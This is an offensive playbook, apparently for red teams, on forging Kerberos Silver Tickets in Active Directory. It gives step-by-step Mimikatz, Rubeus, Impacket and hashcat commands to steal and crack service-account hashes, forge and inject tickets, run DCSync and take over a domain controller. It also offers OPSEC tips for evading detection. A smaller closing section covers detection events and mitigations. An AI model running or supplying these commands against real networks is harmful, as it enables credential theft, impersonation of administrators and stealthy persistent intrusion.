---
title: "Attack #12 — Silver Ticket Attack"
description: "The Silver Ticket attack is the surgical counterpart to the Golden Ticket. Instead of forging a Ticket Granting Ticket (TGT) with the KRBTGT hash (which…"
category: active-directory
tags: ["active-directory", "kerberos", "adcs", "credential-access", "ntlm"]
tools: ["NetExec", "Impacket", "Mimikatz", "Rubeus", "Hashcat"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Two/🟠 Attack #12 — Silver Ticket Attack.md"
---
# 🟠 Attack #12 — Silver Ticket Attack

***

## 📖 How It Works

The Silver Ticket attack is the **surgical counterpart to the Golden Ticket**. Instead of forging a Ticket Granting Ticket (TGT) with the KRBTGT hash (which grants domain-wide access), an attacker forges a **Ticket Granting Service (TGS) ticket** using the **NTLM hash or AES key of a specific service account**. Because service tickets are encrypted and signed with the target service account's secret, the service accepts the forged ticket as legitimate — and critically, **the TGS is validated entirely by the target service, not the Domain Controller**. The DC is never contacted, which makes Silver Tickets significantly stealthier than Golden Tickets.

The forged TGS contains a fabricated PAC (Privilege Attribute Certificate) with whatever group memberships and privileges the attacker specifies. Since the target service trusts the PAC without verifying it against the KDC, the attacker can impersonate any user — including Domain Admins — for that specific service only. This makes Silver Tickets ideal for **targeted, persistent access to individual services** like CIFS (file shares), MSSQL, HTTP (web services), LDAP, or HOST (PsExec/scheduled tasks).

### What You Need to Forge a Silver Ticket

| Parameter | Where to Get It | Notes |
|---|---|---|
| **Service account NT hash** | Kerberoasting, LSASS dump, DCSync, NTDS.dit | The key that encrypts the TGS — this is the core requirement |
| **Service account AES256 key** | Mimikatz `sekurlsa::ekeys`, DCSync | Preferred — stealthier, avoids RC4 downgrade detection |
| **Domain SID** | `whoami /user`, PowerView, `Get-ADDomain` | e.g. `S-1-5-21-...` — everything before the last RID |
| **Domain FQDN** | `$env:USERDNSDOMAIN`, `ipconfig /all` | e.g. `corp.local` |
| **Target SPN** | `setspn -L <account>`, PowerView `Get-DomainSPNTicket` | e.g. `CIFS/DC01.corp.local`, `MSSQLSvc/SQL01.corp.local:1433` |
| **Target username** | Any valid or fabricated username | The user to impersonate in the forged PAC |

### Common Service SPNs and What They Grant

| SPN Type | Example SPN | What Access It Grants |
|---|---|---|
| **CIFS** | `CIFS/DC01.corp.local` | SMB file share access, `dir \\DC01\C$` |
| **HOST** | `HOST/DC01.corp.local` | PsExec, scheduled tasks, WMI on the target |
| **LDAP** | `LDAP/DC01.corp.local` | DCSync-equivalent — replication queries against the DC |
| **MSSQLSvc** | `MSSQLSvc/SQL01.corp.local:1433` | SQL Server access as sysadmin |
| **HTTP** | `HTTP/WEB01.corp.local` | Web application access (ADFS, Exchange OWA, etc.) |
| **WSMAN** | `WSMAN/SRV01.corp.local` | WinRM / Evil-WinRM remote shell |
| **RPCSS** | `RPCSS/DC01.corp.local` | DCOM/RPC access on the target |

### Golden Ticket vs Silver Ticket Comparison

| Aspect | Golden Ticket | Silver Ticket |
|---|---|---|
| **Forges** | TGT (Ticket Granting Ticket) | TGS (Service Ticket) |
| **Key required** | KRBTGT hash | Service account hash |
| **Scope** | Entire domain — any service | Single service only |
| **DC contact** | TGS requests still hit the DC | No DC contact at all |
| **Stealth** | Moderate — TGS requests are logged | High — no KDC event logs generated |
| **Detection** | 4769 without 4768, encryption anomalies | Very difficult — no DC-side events |
| **Prerequisite** | Domain Admin (to get KRBTGT) | Any path to the service account hash |

### The Full Attack Flow

```
1. Compromise a service account hash (Kerberoasting, LSASS dump, DCSync)
2. Identify the target SPN (CIFS, HOST, LDAP, MSSQLSvc, etc.)
3. Collect the domain SID
4. Forge a Silver Ticket offline (no DC contact needed)
5. Inject into current session (kerberos::ptt / Rubeus ptt)
6. Access the target service as the forged user
7. DC never sees the authentication — no 4768/4769 events generated
8. Persist until the service account password is changed
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Service account NT hash or AES key** | Obtained via Kerberoasting (if SPN-registered), LSASS dump, DCSync, or NTDS.dit extraction |
| **Domain SID** | Available from any domain-joined host with low-priv access |
| **Target SPN** | The Service Principal Name of the service you want to access |
| **Network access to target service** | Must be able to reach the service port (445 for CIFS, 1433 for MSSQL, etc.) |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **Mimikatz** | Windows | `kerberos::golden` with `/service:` flag — forges Silver Tickets |
| **Rubeus** | Windows | `silver` subcommand — cleaner syntax, supports AES |
| **Impacket — ticketer.py** | Linux | `-spn` flag for Silver Ticket forging; outputs `.ccache` |
| **Impacket — secretsdump.py** | Linux | Extract service account hashes via DCSync |
| **Impacket — GetUserSPNs.py** | Linux | Kerberoast to obtain service account hashes |
| **CrackMapExec / NetExec** | Linux | `--use-kcache` to authenticate with forged ticket |

***

## 💻 Full Commands

### 🔵 Step 0 — Obtain Target Service Account Hash

```powershell
# ── Kerberoasting — crack the service account password hash ──────────────────
# (Most common path to a Silver Ticket — requires only domain user)

# Rubeus — request TGS for all kerberoastable accounts
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

# Crack with hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt --force

# ── Direct hash extraction (if you have DA or local admin on the service host)
# Mimikatz — dump service account hash from LSASS
privilege::debug
sekurlsa::logonpasswords
# Look for NTLM hash of the service account (e.g. svc_mssql)

# Or extract AES keys specifically
sekurlsa::ekeys
# Look for aes256_hmac value for the target service account
```

```bash
# ── Linux — Kerberoast via Impacket ──────────────────────────────────────────
GetUserSPNs.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10 \
  -request -outputfile kerberoast_hashes.txt

# Crack the hash
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt --force

# ── Linux — DCSync a specific service account ────────────────────────────────
secretsdump.py corp.local/Administrator:'Password1'@DC01.corp.local \
  -just-dc-user corp.local/svc_mssql

# Extract the NT hash from output:
# corp.local\svc_mssql:1103:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::
#                                                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#                                                                This is the NT hash you need
```

***

### 🔵 Step 0b — Enumerate SPNs for the Target Service

```powershell
# Windows — multiple methods
setspn -L svc_mssql                      # List SPNs for specific account
setspn -Q */*                             # List ALL SPNs in the domain

# PowerView
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Active Directory module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | 
  Select-Object Name, ServicePrincipalName
```

```bash
# Linux — enumerate SPNs
GetUserSPNs.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10
# Lists all kerberoastable SPNs with their service accounts
```

***

### 🔴 Mimikatz — Forge & Inject Silver Ticket (Windows)

```powershell
# ── Silver Ticket for CIFS — access file shares on DC01 ──────────────────────
kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /target:DC01.corp.local \
  /service:CIFS \
  /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /ptt

# ── Flags explained:
# /user     = username to impersonate (DA or any user)
# /domain   = domain FQDN
# /sid      = domain SID
# /target   = FQDN of the target server hosting the service
# /service  = service type (CIFS, HOST, LDAP, MSSQLSvc, HTTP, etc.)
# /rc4      = NT hash of the service account running the target service
# /ptt      = inject directly into current session

# ── Silver Ticket with AES256 (stealthiest) ──────────────────────────────────
kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /target:DC01.corp.local \
  /service:CIFS \
  /aes256:b65fb27c8e0d7c5f48b16c10b4c1d91a9b3c2d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /ptt

# ── Silver Ticket for HOST — enables PsExec / scheduled tasks ────────────────
kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /target:DC01.corp.local \
  /service:HOST \
  /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /ptt

# ── Silver Ticket for LDAP — DCSync-equivalent without DA ────────────────────
# ⚠️ Requires the DC's machine account hash (DC01$ computer account)
kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /target:DC01.corp.local \
  /service:LDAP \
  /rc4:<DC01_MACHINE_ACCOUNT_HASH> \
  /ptt
# Now you can run: lsadump::dcsync /domain:corp.local /user:krbtgt

# ── Silver Ticket for MSSQLSvc — SQL Server as sysadmin ──────────────────────
kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /target:SQL01.corp.local \
  /service:MSSQLSvc \
  /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /ptt

# ── Save to .kirbi file (for later use / transfer) ───────────────────────────
kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /target:DC01.corp.local \
  /service:CIFS \
  /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /ticket:silver_cifs.kirbi

# Inject saved .kirbi later
kerberos::ptt silver_cifs.kirbi

# ── Verify injection ─────────────────────────────────────────────────────────
klist
# Should show a ticket for cifs/DC01.corp.local

# ── Use the Silver Ticket ────────────────────────────────────────────────────
dir \\DC01.corp.local\C$             # CIFS ticket
psexec.exe \\DC01.corp.local cmd.exe  # HOST ticket
```

***

### 🔴 Rubeus — Forge Silver Ticket (Windows — Modern Approach)

```powershell
# ── Silver Ticket with RC4 ───────────────────────────────────────────────────
.\Rubeus.exe silver \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /service:CIFS/DC01.corp.local \
  /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /ptt /nowrap

# ── Silver Ticket with AES256 ────────────────────────────────────────────────
.\Rubeus.exe silver \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /service:CIFS/DC01.corp.local \
  /aes256:b65fb27c8e0d7c5f48b16c10b4c1d91a9b3c2d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /ptt /nowrap

# ── HOST ticket for remote execution ─────────────────────────────────────────
.\Rubeus.exe silver \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /service:HOST/DC01.corp.local \
  /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /ptt /nowrap

# ── Verify ───────────────────────────────────────────────────────────────────
.\Rubeus.exe triage
klist
```

***

### 🔴 Impacket — ticketer.py (Linux — Forge Silver Ticket)

```bash
# ── Forge Silver Ticket for CIFS from Linux ───────────────────────────────────
ticketer.py -nthash a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  -domain-sid S-1-5-21-3878595448-1012506728-1948843120 \
  -domain corp.local \
  -spn CIFS/DC01.corp.local \
  Administrator
# Output: Administrator.ccache

# ── Forge using AES256 key ────────────────────────────────────────────────────
ticketer.py -aesKey b65fb27c8e0d7c5f48b16c10b4c1d91a9b3c2d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  -domain-sid S-1-5-21-3878595448-1012506728-1948843120 \
  -domain corp.local \
  -spn CIFS/DC01.corp.local \
  Administrator

# ── Forge for HOST (PsExec) ───────────────────────────────────────────────────
ticketer.py -nthash a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  -domain-sid S-1-5-21-3878595448-1012506728-1948843120 \
  -domain corp.local \
  -spn HOST/DC01.corp.local \
  Administrator

# ── Forge for LDAP (DCSync-equivalent) ────────────────────────────────────────
ticketer.py -nthash <DC01_MACHINE_HASH> \
  -domain-sid S-1-5-21-3878595448-1012506728-1948843120 \
  -domain corp.local \
  -spn LDAP/DC01.corp.local \
  Administrator

# ── Forge for MSSQLSvc ────────────────────────────────────────────────────────
ticketer.py -nthash a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  -domain-sid S-1-5-21-3878595448-1012506728-1948843120 \
  -domain corp.local \
  -spn MSSQLSvc/SQL01.corp.local:1433 \
  Administrator

# ── Set and use the ticket ────────────────────────────────────────────────────
export KRB5CCNAME=Administrator.ccache

# CIFS access
smbclient.py -k -no-pass corp.local/Administrator@DC01.corp.local

# Remote execution (HOST ticket)
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
wmiexec.py -k -no-pass corp.local/Administrator@DC01.corp.local

# DCSync via LDAP Silver Ticket
secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local

# NetExec
nxc smb DC01.corp.local --use-kcache
nxc smb DC01.corp.local --use-kcache -x "whoami /all"

# MSSQL access
mssqlclient.py -k -no-pass corp.local/Administrator@SQL01.corp.local -windows-auth
```

***

### 🔴 Multi-Service Silver Ticket Combo (Full Host Takeover)

```bash
# ── To fully own a target host, you often need BOTH CIFS + HOST tickets ──────
# CIFS = file share access | HOST = remote execution

# Forge CIFS ticket
ticketer.py -nthash a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  -domain-sid S-1-5-21-3878595448-1012506728-1948843120 \
  -domain corp.local \
  -spn CIFS/DC01.corp.local \
  Administrator

# Use CIFS ticket to upload tools
export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass corp.local/Administrator@DC01.corp.local
# > put mimikatz.exe

# Forge HOST ticket (same hash, different SPN)
ticketer.py -nthash a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  -domain-sid S-1-5-21-3878595448-1012506728-1948843120 \
  -domain corp.local \
  -spn HOST/DC01.corp.local \
  Administrator

# Use HOST ticket to execute
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
```

***

## 🎯 OPSEC Tips

- **Use AES256 over RC4** — RC4-encrypted Silver Tickets produce `EncryptionType: 0x17` in local service logs, which is anomalous in AES-only environments; AES256 (`0x12`) blends with normal traffic
- **Target specific services** — a Silver Ticket for CIFS on a single file server is far less suspicious than broad access patterns
- **Set realistic ticket lifetimes** — default Mimikatz creates 10-year tickets; set to standard 10-hour lifetime to blend in
- **Silver Tickets don't touch the DC** — this is your biggest stealth advantage; there are zero KDC-side event logs generated for the forged ticket
- **For LDAP Silver Tickets** — you need the **DC's machine account hash** (DC01$), not a user service account; the LDAP service on a DC runs under the computer account
- **Don't generate excessive service tickets** — rapid creation of Silver Tickets for multiple services on the same host correlates in endpoint logs
- **Prefer Silver Tickets over Golden Tickets** when you only need access to one service — smaller blast radius means less detection surface

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4624** | Security Log (Target Host) | Logon Type 3 from unexpected source — Silver Tickets bypass the DC, so the logon event only appears on the target server |
| **4634** | Security Log (Target Host) | Logoff after suspicious session — correlate with 4624 |
| **4672** | Security Log (Target Host) | Special privileges assigned — DA-level access from unexpected user on the target host |
| **4769** | Security Log (DC) | **ABSENT** — this is the key indicator; there should be NO 4769 on the DC for a Silver Ticket, because the DC was never contacted |
| **4768** | Security Log (DC) | **ABSENT** — no TGT request either; if service access occurs without 4768 + 4769, it's a forged ticket |

**Primary detection challenge:** Silver Tickets are inherently harder to detect than Golden Tickets because **the Domain Controller is completely bypassed**. The forged TGS is presented directly to the target service, which validates it locally using its own service account key. There are no KDC-side audit events. Detection must rely on **endpoint-level monitoring** — looking for service access events (4624 Type 3) on target servers that have no corresponding TGT/TGS request trail on the DC. Microsoft's PAC validation feature (enabled by default since November 2021 patches) adds a server-side check where the service contacts the DC to validate the PAC, which significantly improves Silver Ticket detection.

### PAC Validation — The Silver Ticket Killer

```
# Post-November 2021 Windows Updates:
# - Services now validate the PAC by contacting the DC
# - This means Silver Tickets with fabricated PACs will FAIL on patched systems
# - The DC checks if the user actually has the claimed group memberships
# - This doesn't kill Silver Tickets entirely — tickets forged with CORRECT
#   PAC data (real user, real groups) still work
# - But you can no longer forge tickets for fake users or fake group memberships
```

***

## 🔗 Attack Chain Context

```
[Silver Ticket] ──→ Targeted Service Access
         │
         ├──→ 📁 CIFS Silver Ticket → SMB file share access (C$, ADMIN$)
         ├──→ 💻 HOST Silver Ticket → PsExec / scheduled tasks / remote exec
         ├──→ 🩸 LDAP Silver Ticket → DCSync equivalent (needs DC machine hash)
         ├──→ 🗄️ MSSQLSvc Silver Ticket → SQL Server sysadmin access
         ├──→ 🌐 HTTP Silver Ticket → Web app access (Exchange, ADFS)
         ├──→ 🔑 Stealthier than Golden Ticket — no DC event logs
         ├──→ 🔒 Survives: password changes of OTHER accounts
         └──→ 💀 Defeated by: service account password rotation + PAC validation
```

**The Silver Ticket persists** until the target service account's password is changed. Unlike Golden Tickets (which require KRBTGT reset × 2), a simple password rotation of the compromised service account invalidates all forged Silver Tickets for that service. This is why **Managed Service Accounts (gMSAs)** — which auto-rotate passwords every 30 days — are the strongest mitigation against Silver Ticket persistence.

***

> ✅ **Attack #12 — Silver Ticket complete.**
